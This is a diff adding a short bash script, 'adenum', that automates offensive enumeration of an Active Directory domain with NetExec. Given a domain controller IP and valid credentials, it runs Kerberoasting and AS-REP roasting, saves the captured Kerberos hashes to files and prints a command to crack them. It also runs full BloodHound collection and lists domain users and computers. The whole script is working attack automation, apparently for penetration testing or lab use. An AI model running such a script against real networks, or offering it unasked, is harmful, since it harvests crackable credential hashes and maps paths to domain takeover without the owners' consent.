@@ -1,0 +1,76 @@
+#!/bin/bash
+
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+usage() {
+    echo -e "${RED}Usage: adenum <dc_ip> <domain> <user> <pass>${NC}"
+    echo -e "${RED}  Ex:  adenum 10.10.10.1 corp.local john.doe Password123${NC}"
+    exit 1
+}
+
+[ "$#" -ne 4 ] && usage
+
+DC_IP="$1"
+DOMAIN="$2"
+USER="$3"
+PASS="$4"
+
+OUTDIR="./hashes"
+BHDIR="./bloodhound"
+mkdir -p "$OUTDIR" "$BHDIR"
+
+echo ""
+echo -e "${YELLOW}== AD Enumeration: $DOMAIN ($DC_IP) ==${NC}"
+
+# Kerberoasting
+echo -e "\n${CYAN}[kerberoasting]${NC}"
+nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" \
+    --kerberoasting "$OUTDIR/kerberoast.txt" 2>/dev/null
+count=$(grep -c 'krb5tgs' "$OUTDIR/kerberoast.txt" 2>/dev/null || echo 0)
+if [ "$count" -gt 0 ]; then
+    echo -e "${GREEN}[+] $count hash(es) → $OUTDIR/kerberoast.txt${NC}"
+    echo -e "${BLUE}    crack: crack $OUTDIR/kerberoast.txt${NC}"
+else
+    echo -e "${RED}[-] No kerberoastable users${NC}"
+fi
+
+# AS-REP Roasting
+echo -e "\n${CYAN}[as-rep roasting]${NC}"
+nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" \
+    --asreproast "$OUTDIR/asrep.txt" --kdcHost "$DC_IP" 2>/dev/null
+count=$(grep -c 'krb5asrep' "$OUTDIR/asrep.txt" 2>/dev/null || echo 0)
+if [ "$count" -gt 0 ]; then
+    echo -e "${GREEN}[+] $count hash(es) → $OUTDIR/asrep.txt${NC}"
+    echo -e "${BLUE}    crack: crack $OUTDIR/asrep.txt${NC}"
+else
+    echo -e "${RED}[-] No AS-REP roastable users${NC}"
+fi
+
+# BloodHound
+echo -e "\n${CYAN}[bloodhound]${NC}"
+nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -d "$DOMAIN" \
+    --bloodhound -ns "$DC_IP" -c All,GPOLocalGroup \
+    --output "$BHDIR" 2>/dev/null
+if ls "$BHDIR"/*.json &>/dev/null; then
+    echo -e "${GREEN}[+] Data collected → $BHDIR/${NC}"
+else
+    echo -e "${RED}[-] BloodHound collection failed${NC}"
+fi
+
+# Users & Computers quick summary
+echo -e "\n${CYAN}[domain users]${NC}"
+nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --users 2>/dev/null | \
+    grep -oP 'username:\s*\K\S+' | head -20
+
+echo -e "\n${CYAN}[domain computers]${NC}"
+nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --computers 2>/dev/null | \
+    grep -oP 'sAMAccountName:\s*\K\S+' | head -20
+
+echo ""
+echo -e "${YELLOW}=================================${NC}"
+echo -e "${YELLOW}Output: $OUTDIR/ | $BHDIR/${NC}"
